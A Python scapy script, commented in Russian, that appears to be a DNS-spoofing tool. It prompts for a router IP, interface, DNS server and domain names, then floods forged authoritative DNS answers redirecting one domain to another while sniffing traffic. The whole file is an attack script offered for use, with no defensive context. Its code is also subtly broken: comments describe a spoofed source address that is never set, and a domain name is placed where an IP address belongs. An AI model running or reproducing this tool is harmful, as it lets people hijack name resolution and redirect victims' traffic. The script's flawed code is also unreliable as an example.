from scapy.all import *
import threading

# Функция для отправки пакетов
def send_packets(target_ip, interface, dns_server, original_dns, new_dns):
    while True:
        # Создаем DNS-запрос
        dns_request = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=original_dns))

        # Отправляем DNS-запрос с поддельным источником IP-адреса
        send(dns_request, verbose=0, iface=interface)

        # Создаем ответ на DNS-запрос
        dns_response = IP(dst=target_ip) / UDP(dport=53) / DNS(id=dns_request[DNS].id, qr=1, aa=1, qd=dns_request[DNS].qd, an=DNSRR(rrname=original_dns, ttl=10, rdata=new_dns))

        # Отправляем ответ на DNS-запрос с поддельным источником IP-адреса
        send(dns_response, verbose=0, iface=interface)

# Функция для анализа пакетов
def analyze_packets(interface):
    sniff(iface=interface, prn=lambda x: x.summary())

def main():
    # Получаем IP-адрес роутера от пользователя
    target_ip = input("Введите IP-адрес роутера: ")

    # Получаем интерфейс от пользователя
    interface = input("Введите интерфейс (например, eth0): ")

    # Получаем IP-адрес DNS-сервера от пользователя
    dns_server = input("Введите IP-адрес DNS-сервера (например, 8.8.8.8): ")

    # Получаем оригинальное доменное имя от пользователя
    original_dns = input("Введите оригинальное доменное имя (например, google.com): ")

    # Получаем новое доменное имя от пользователя
    new_dns = input("Введите новое доменное имя (например, youtube.com): ")

    # Создаем поток для отправки пакетов
    send_thread = threading.Thread(target=send_packets, args=(target_ip, interface, dns_server, original_dns, new_dns))
    send_thread.start()

    # Создаем поток для анализа пакетов
    analyze_thread = threading.Thread(target=analyze_packets, args=(interface,))
    analyze_thread.start()

if __name__ == '__main__':
    main()